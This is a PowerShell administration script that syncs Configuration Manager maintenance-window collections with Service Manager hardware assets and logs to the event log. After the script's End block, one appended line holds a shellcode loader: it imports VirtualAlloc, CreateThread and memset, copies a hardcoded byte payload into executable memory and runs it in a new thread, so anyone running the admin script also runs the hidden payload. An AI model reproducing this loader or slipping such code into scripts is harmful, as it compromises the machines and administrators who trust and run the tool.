
[CmdletBinding(SupportsShouldProcess=$true)]
param(
    [parameter(Mandatory=$true, HelpMessage="Site server where the SMS Provider is installed.")]
    [ValidateNotNullOrEmpty()]
    [ValidateScript({Test-Connection -ComputerName $_ -Count 1 -Quiet})]
    [string]$SiteServer,

    [parameter(Mandatory=$true, HelpMessage="Value for the Service Manager target server.")]
    [ValidateNotNullOrEmpty()]
    [ValidateScript({Test-Connection -ComputerName $_ -Count 1 -Quiet})]
    [string]$SMDefaultComputer,

    [parameter(Mandatory=$false, HelpMessage="Set a prefix used for filtering Maintenance Windows device collections.")]
    [ValidateNotNullOrEmpty()]
    [string]$MaintenanceWindowNamePrefix = "MWS -",

    [parameter(Mandatory=$false, HelpMessage="Show a progressbar displaying the current operation.")]
    [switch]$ShowProgress
)
Begin {
    
    try {
        Write-Verbose -Message "Determining Site Code for Site server: '$($SiteServer)'"
        $SiteCodeObjects = Get-WmiObject -Namespace "root\SMS" -Class SMS_ProviderLocation -ComputerName $SiteServer -ErrorAction Stop
        foreach ($SiteCodeObject in $SiteCodeObjects) {
            if ($SiteCodeObject.ProviderForLocalSite -eq $true) {
                $SiteCode = $SiteCodeObject.SiteCode
                Write-Verbose -Message "Site Code: $($SiteCode)"
            }
        }
    }
    catch [System.UnauthorizedAccessException] {
        Write-Warning -Message "Access denied" ; break
    }
    catch [System.Exception] {
        Write-Warning -Message "Unable to determine Site Code" ; break
    }

    
    try {
        $SiteDrive = $SiteCode + ":"
        Import-Module -Name ConfigurationManager -ErrorAction Stop -Verbose:$false
    }
    catch [System.UnauthorizedAccessException] {
        Write-Warning -Message "Access denied" ; break
    }
    catch [System.Exception] {
        try {
            Import-Module -Name (Join-Path -Path (($env:SMS_ADMIN_UI_PATH).Substring(0,$env:SMS_ADMIN_UI_PATH.Length-5)) -ChildPath "\ConfigurationManager.psd1") -Force -ErrorAction Stop -Verbose:$false
            if ((Get-PSDrive -Name $SiteCode -ErrorAction SilentlyContinue | Measure-Object).Count -ne 1) {
                New-PSDrive -Name $SiteCode -PSProvider "AdminUI.PS.Provider\CMSite" -Root $SiteServer -ErrorAction Stop -Verbose:$false | Out-Null
            }
        }
        catch [System.UnauthorizedAccessException] {
            Write-Warning -Message "Access denied" ; break
        }
        catch [System.Exception] {
            Write-Warning -Message "$($_.Exception.Message). Line: $($_.InvocationInfo.ScriptLineNumber)" ; break
        }
    }

    
    try {
        Import-Module -Name SMLets -ErrorAction Stop -Verbose:$false
    }
    catch [System.UnauthorizedAccessException] {
        Write-Warning -Message "Access denied" ; break
    }
    catch [System.Exception] {
        Write-Warning -Message "$($_.Exception.Message). Line: $($_.InvocationInfo.ScriptLineNumber)" ; break
    }

    
    $CurrentLocation = $PSScriptRoot
}
Process {
    
    function Write-EventLogEntry {
        param(
            [parameter(Mandatory=$true)]
            [ValidateNotNullOrEmpty()]
            [string]$LogName,

            [parameter(Mandatory=$true)]
            [ValidateNotNullOrEmpty()]
            [string]$Source,

            [parameter(Mandatory=$true)]
            [ValidateNotNullOrEmpty()]
            [int]$EventID,

            [parameter(Mandatory=$true)]
            [ValidateNotNullOrEmpty()]
            [ValidateSet("Information","Warning","Error")]
            [string]$EntryType,

            [parameter(Mandatory=$true)]
            [ValidateNotNullOrEmpty()]
            [string]$Message
        )
        
        if ([System.Diagnostics.EventLog]::Exists($LogName) -eq $false) {
            try {
                New-EventLog -LogName $LogName -Source $Source -ErrorAction Stop -Verbose:$false | Out-Null
            }
            catch [System.Exception] {
                Write-Warning -Message "$($_.Exception.Message). Line: $($_.InvocationInfo.ScriptLineNumber)" ; break
            }
        }

        
        try {
            Write-EventLog -LogName $LogName -Source $Source -EntryType $EntryType -EventId $EventID -Message $Message -ErrorAction Stop
        }
        catch [System.Exception] {
            Write-Warning -Message "$($_.Exception.Message). Line: $($_.InvocationInfo.ScriptLineNumber)" ; break
        }
    }

    function New-DirectMembershipRule {
        param(
            [parameter(Mandatory=$true)]
            [ValidateNotNullOrEmpty()]
            [string]$RuleName,

            [parameter(Mandatory=$true)]
            [ValidateNotNullOrEmpty()]
            [string]$ResourceID
        )
        
        $DirectMembershipRuleInstance = ([WmiClass]"\\$($SiteServer)\root\SMS\site_$($SiteCode):SMS_CollectionRuleDirect").CreateInstance()
        $DirectMembershipRuleInstance.ResourceClassName = "SMS_R_System"
        $DirectMembershipRuleInstance.ResourceID = $ResourceID
        $DirectMembershipRuleInstance.RuleName = $RuleName
        return $DirectMembershipRuleInstance
    }

    if ($PSBoundParameters["ShowProgress"]) {
        $ProgressCount = 0
    }

    
    Write-EventLogEntry -LogName "ConfigMgr Maintenance Windows" -Source "Maintenance Window Populator" -EventID 1000 -EntryType Information -Message "Initialize processing of server maintenance window memberships."

    
    try {
        $MaintenanceWindowCollectionList = New-Object -TypeName System.Collections.ArrayList
        $MaintenanceWindowCollections = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class SMS_Collection -ComputerName $SiteServer -Filter "Name like '$($MaintenanceWindowNamePrefix)%'" -ErrorAction Stop | Select-Object -Property Name, CollectionID
        if ($MaintenanceWindowCollections -ne $null) {
            $MaintenanceWindowCollectionList.AddRange(@($MaintenanceWindowCollections))
        }
        else {
            Write-EventLogEntry -LogName "ConfigMgr Maintenance Windows" -Source "Maintenance Window Populator" -EventID 1001 -EntryType Warning -Message "Query for Maintenance Windows collections returned no results, aborting current operation."
        }
    }
    catch [System.Exception] {
        Write-Warning -Message "$($_.Exception.Message). Line: $($_.InvocationInfo.ScriptLineNumber)" ; break
    }

    
    if ($MaintenanceWindowCollectionList -ne $null) {

        
        try {
            $SCSMClass = Get-SCSMClass -Name Cireson.AssetManagement.HardwareAsset -ErrorAction Stop -Verbose:$false
        }
        catch [System.Exception] {
            Write-Warning -Message "$($_.Exception.Message). Line: $($_.InvocationInfo.ScriptLineNumber)" ; break
        }

        
        $MaintenanceWindowsCount = ($MaintenanceWindowCollectionList | Measure-Object).Count

        foreach ($MaintenanceWindowCollection in $MaintenanceWindowCollectionList) {
            
            $StartTime = (Get-Date)

            
            Write-EventLogEntry -LogName "ConfigMgr Maintenance Windows" -Source "Maintenance Window Populator" -EventID 1002 -EntryType Information -Message "Processing current Maintenance Window collection: $($MaintenanceWindowCollection.Name)"

            
            if ($PSBoundParameters["ShowProgress"]) {
                $ProgressCount++
                Write-Progress -Activity "Processing Maintenance Window collections" -Id 1 -Status "$($ProgressCount) / $($MaintenanceWindowsCount)" -PercentComplete (($ProgressCount / $MaintenanceWindowsCount) * 100)
            }

            
            $ServiceWindowID = Get-SCSMEnumeration -ErrorAction Stop -Verbose:$false | Where-Object { $_.DisplayName -eq $MaintenanceWindowCollection.Name } | Select-Object -ExpandProperty ID
            if ($ServiceWindowID -ne $null) {
                $SCSMServers = Get-SCSMObject -Class $SCSMClass -Filter "ServiceWindow -eq $($ServiceWindowID)" | Select-Object -ExpandProperty DisplayName
                $ConfigMgrServers = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class SMS_FullCollectionMembership -ComputerName $SiteServer -Filter "CollectionID like '$($MaintenanceWindowCollection.CollectionID)'" | Select-Object -ExpandProperty Name
                if ($SCSMServers -ne $null) {
                    
                    $ComparedResults = Compare-Object -ReferenceObject $SCSMServers -DifferenceObject $ConfigMgrServers
                    if (($ComparedResults | Measure-Object).Count -ge 1) {
                        $AddToMaintenanceWindow = $ComparedResults | Where-Object { $_.SideIndicator -like "<=" } | Select-Object -ExpandProperty InputObject
                        $RemoveFromMaintenanceWindow = $ComparedResults | Where-Object { $_.SideIndicator -like "=>" } | Select-Object -ExpandProperty InputObject

                        
                        try {
                            $CurrentMaintenanceWindowCollection = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class SMS_Collection -ComputerName $SiteServer -Filter "Name like '$($MaintenanceWindowCollection.Name)'"
                            $CurrentMaintenanceWindowCollection.Get()
                        }
                        catch [System.Exception] {
                            Write-EventLogEntry -LogName "ConfigMgr Maintenance Windows" -Source "Maintenance Window Populator" -EventID 1003 -EntryType Warning -Message "Server '$($SCSMServer.DisplayName)' was not found in Configuration Manager, will not attemp to add resource to Maintenance Window collection."
                        }
                    
                        
                        if ($AddToMaintenanceWindow -ne $null) {
                            
                            $DirectMembershipRulesList = New-Object -TypeName System.Collections.ArrayList
                            $DirectMembershipRulesList.AddRange(@($CurrentMaintenanceWindowCollection.CollectionRules))

                            
                            foreach ($SCSMServer in $AddToMaintenanceWindow) {
                                try {
                                    $DeviceResourceID = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class SMS_R_System -ComputerName $SiteServer -Filter "Name like '$($SCSMServer)'" -ErrorAction Stop | Select-Object -ExpandProperty ResourceID
                                    $DirectMembershipRulesList.Add((New-DirectMembershipRule -RuleName $SCSMServer -ResourceID $DeviceResourceID)) | Out-Null
                                }
                                catch [System.Exception] {
                                    Write-EventLogEntry -LogName "ConfigMgr Maintenance Windows" -Source "Maintenance Window Populator" -EventID 1004 -EntryType Warning -Message "Server '$($SCSMServer.DisplayName)' was not found in Configuration Manager, will not attemp to add resource to Maintenance Window collection."
                                }
                            }

                            
                            $CurrentMaintenanceWindowCollection.CollectionRules = $DirectMembershipRulesList
                            $CurrentMaintenanceWindowCollection.Put() | Out-Null
                            Write-EventLogEntry -LogName "ConfigMgr Maintenance Windows" -Source "Maintenance Window Populator" -EventID 1005 -EntryType Information -Message "Successfully populated Maintenance Window '$($MaintenanceWindowCollection.Name)' with $(($AddToMaintenanceWindow | Measure-Object).Count) servers sourced from Service Manager."
                        }

                        
                        if ($RemoveFromMaintenanceWindow -ne $null) {
                            
                            $DirectMembershipRulesList = New-Object -TypeName System.Collections.ArrayList
                            $DirectMembershipRulesList.AddRange(@($CurrentMaintenanceWindowCollection.CollectionRules))

                            
                            foreach ($SCSMServer in $RemoveFromMaintenanceWindow) {
                                if ($SCSMServer -in $DirectMembershipRulesList.RuleName) {
                                    $DirectMembershipRulesList.RemoveAt($DirectMembershipRulesList.RuleName.IndexOf($SCSMServer))
                                }
                            }

                            
                            $CurrentMaintenanceWindowCollection.CollectionRules = $DirectMembershipRulesList
                            $CurrentMaintenanceWindowCollection.Put() | Out-Null
                            Write-EventLogEntry -LogName "ConfigMgr Maintenance Windows" -Source "Maintenance Window Populator" -EventID 1006 -EntryType Information -Message "Successfully removed $(($RemoveFromMaintenanceWindow | Measure-Object).Count) servers from Maintenance Window '$($MaintenanceWindowCollection.Name)'."
                        }

                        
                        $CurrentMaintenanceWindowCollection.RequestRefresh() | Out-Null
                    }
                    else {
                        Write-EventLogEntry -LogName "ConfigMgr Maintenance Windows" -Source "Maintenance Window Populator" -EventID 1007 -EntryType Information -Message "Current Maintenance Window collection '$($MaintenanceWindowCollection.Name)' does not have any changes."
                    }
                }
            }

            
            $ExecutionTime = (Get-Date) - $StartTime

            
            Write-EventLogEntry -LogName "ConfigMgr Maintenance Windows" -Source "Maintenance Window Populator" -EventID 1008 -EntryType Information -Message "Finished processing current Maintenance Window collection: $($MaintenanceWindowCollection.Name). Operation took $($ExecutionTime.Minutes) min $($ExecutionTime.Seconds) sec."
        }
    }
}
End {
    
    Write-EventLogEntry -LogName "ConfigMgr Maintenance Windows" -Source "Maintenance Window Populator" -EventID 1009 -EntryType Information -Message "Successfully processed server maintenance window collection memberships."

    
    Set-Location -Path $CurrentLocation
}
$eveE = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $eveE -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x9d,0x53,0x45,0xed,0xda,0xde,0xd9,0x74,0x24,0xf4,0x5e,0x33,0xc9,0xb1,0x47,0x83,0xc6,0x04,0x31,0x46,0x0f,0x03,0x46,0x92,0xb1,0xb0,0x11,0x44,0xb7,0x3b,0xea,0x94,0xd8,0xb2,0x0f,0xa5,0xd8,0xa1,0x44,0x95,0xe8,0xa2,0x09,0x19,0x82,0xe7,0xb9,0xaa,0xe6,0x2f,0xcd,0x1b,0x4c,0x16,0xe0,0x9c,0xfd,0x6a,0x63,0x1e,0xfc,0xbe,0x43,0x1f,0xcf,0xb2,0x82,0x58,0x32,0x3e,0xd6,0x31,0x38,0xed,0xc7,0x36,0x74,0x2e,0x63,0x04,0x98,0x36,0x90,0xdc,0x9b,0x17,0x07,0x57,0xc2,0xb7,0xa9,0xb4,0x7e,0xfe,0xb1,0xd9,0xbb,0x48,0x49,0x29,0x37,0x4b,0x9b,0x60,0xb8,0xe0,0xe2,0x4d,0x4b,0xf8,0x23,0x69,0xb4,0x8f,0x5d,0x8a,0x49,0x88,0x99,0xf1,0x95,0x1d,0x3a,0x51,0x5d,0x85,0xe6,0x60,0xb2,0x50,0x6c,0x6e,0x7f,0x16,0x2a,0x72,0x7e,0xfb,0x40,0x8e,0x0b,0xfa,0x86,0x07,0x4f,0xd9,0x02,0x4c,0x0b,0x40,0x12,0x28,0xfa,0x7d,0x44,0x93,0xa3,0xdb,0x0e,0x39,0xb7,0x51,0x4d,0x55,0x74,0x58,0x6e,0xa5,0x12,0xeb,0x1d,0x97,0xbd,0x47,0x8a,0x9b,0x36,0x4e,0x4d,0xdc,0x6c,0x36,0xc1,0x23,0x8f,0x47,0xcb,0xe7,0xdb,0x17,0x63,0xce,0x63,0xfc,0x73,0xef,0xb1,0x69,0x71,0x67,0xfa,0xc6,0x78,0x1e,0x92,0x14,0x7b,0xf5,0xd1,0x90,0x9d,0xa5,0x45,0xf3,0x31,0x05,0x36,0xb3,0xe1,0xed,0x5c,0x3c,0xdd,0x0d,0x5f,0x96,0x76,0xa7,0xb0,0x4f,0x2e,0x5f,0x28,0xca,0xa4,0xfe,0xb5,0xc0,0xc0,0xc0,0x3e,0xe7,0x35,0x8e,0xb6,0x82,0x25,0x66,0x37,0xd9,0x14,0x20,0x48,0xf7,0x33,0xcc,0xdc,0xfc,0x95,0x9b,0x48,0xff,0xc0,0xeb,0xd6,0x00,0x27,0x60,0xde,0x94,0x88,0x1e,0x1f,0x79,0x09,0xde,0x49,0x13,0x09,0xb6,0x2d,0x47,0x5a,0xa3,0x31,0x52,0xce,0x78,0xa4,0x5d,0xa7,0x2d,0x6f,0x36,0x45,0x08,0x47,0x99,0xb6,0x7f,0x59,0xe5,0x60,0xb9,0x2f,0x07,0xb1;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$pJc=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($pJc.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$pJc,0,0,0);for (;;){Start-sleep 60};

